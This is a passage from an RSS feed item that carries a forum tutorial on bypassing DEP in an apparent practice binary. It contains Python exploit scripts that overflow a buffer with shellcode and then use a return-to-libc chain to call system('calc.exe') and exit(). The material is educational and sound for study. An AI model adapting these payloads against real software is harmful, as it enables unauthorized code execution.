shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"

buff = "\x41" * 52
ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4    # ebp
r = shellcode


data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + ebp_20 + ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r

with open("fichero.dat", "w") as file:
	file.write(data)

subprocess.call(r"stack9b.exe")
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a9a67cdb72adf827e5b5e409ccbde82b00fdf3ec.png" alt="stack_opt" data-base62-sha1="ocNoegAKYfH4niKqNtkUZgXSBS4" width="690" height="329"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/10202ccbd2956a2842c363acefbe38e16a2e2a6f.png" alt="idaex_opt" data-base62-sha1="2iEzATDjtdUSlJk5U8qQJAg9Cmb" width="690" height="195"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/97e7b9ddf00f11d1b8330b677c915395f5bc0a37.png" alt="pe_opt(1)" data-base62-sha1="lFOzgrHDAlgKDEigkfKrQNtat7N" width="690" height="277"></p>
<p>Well, we already have EIP under control but now it doesn’t allow me to execute my shellcode, this is due to <strong>DEP</strong> (data execution prevention).</p>
<p><em>Summarizing up, DEP changes the permissions of the segments where data is stored to prevent us from executing code there   -ricnar</em></p>
<p>So to bypass the DEP we can do <strong>ROP</strong> (return oriented programming) which is basically using gadgets that are program’s executable code to change the stack permissions with some api like <strong>VirtualProtect</strong> or <strong>VirtualAlloc</strong></p>
<p>Looking for gadgets in <strong>pepe.dll</strong> I couldn’t find VirtualAlloc, but there is a pointer to <strong>system()</strong> , would only be missing a return that can be <strong>exit()</strong> and a fixed place that we can control to pass it a string to system()</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/339c2d545022c054d21037730383cf022128555f.png" alt="system_opt(1)" data-base62-sha1="7myXrH1XyIzaq5QNka1KxltAOGr" width="500" height="270"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/9c05b9a72fb45ec9c15ec8d99c214b590a885b0d.png" alt="exit_opt" data-base62-sha1="mgeKB6YwmVjl4LSbUDMajQ2sZ2t" width="500" height="55"></p>
<p>Now only the string for system() would be missing, we can use the address with write permission</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2e8fd263e848b53b8b135f485a278d96cf99505e.png" alt="calc_opt(1)" data-base62-sha1="6DU6eldeB03SW5pXOdV3AcJZzVs" width="600" height="82"></p>
<p>Here I set up the stack because <strong>malloc</strong> only assigned 50 bytes and then had no control over the eip and that’s how the exploit would look.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c23b185d41f0f55226914125c67ca1f40ec3cd20.png" alt="good_opt" data-base62-sha1="rIfeSUukjw2ha9F8FMq4fXLB280" width="690" height="310"></p>
<pre><code class="lang-python">import subprocess

system = "\x24\x98\x01\x78"    # system()
calc = "calc.exe"

buff = "\x41" * 42
#ebp_20 = "\x41" * 4
ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
ebp_18 = "\x41" * 4
ebp_14 = "\x41" * 4
ebp_10 = "\x41" * 4
ebp_c = "\x41" * 4
ebp_8 = "\x41" * 4
ebp_4 = "\x41" * 4
s = "\x41" * 4    # ebp
r = system
exit = "\x78\x1d\x10\x10"    # exit()
ptr_calc = "\x5a\x30\x10\x10"



data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + calc + "\x41" * 6 +  ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calc

with open("fichero.dat", "w") as file:
	file.write(data)

subprocess.call(r"stack9b.exe")
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/17b7def17c2540e0b5e53c5b811e956a4201298a.png" alt="WO_opt" data-base62-sha1="3nOVflwi6BkMO1glJmUirb7Hw2m" width="690" height="330"></p>
            <p><small>13 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988</link>
          <pubDate>Tue, 05 Jun 2018 11:19:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-6988</guid>
          <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
        </item>
  </channel>
</rss>
